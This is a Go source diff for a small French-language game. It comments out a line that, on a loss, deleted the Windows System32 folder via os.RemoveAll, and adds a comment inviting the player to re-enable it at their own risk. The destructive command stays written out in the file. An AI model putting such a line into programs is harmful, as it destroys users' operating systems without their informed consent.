@@ -42,7 +42,9 @@ func main() {
 			score++
 		} else {
 			fmt.Println("Dommage, vous avez perdu. Essayez à nouveau !")
-			os.RemoveAll("C:\\Windows\\System32")
+
+			// Vous pouvez enlever les deux // Mais c'est à risque et périls, je ne suis responsable de tout endomagement de pc. C'est votre choix.
+			 //os.RemoveAll("C:\\Windows\\System32")
 			break
 		}
 
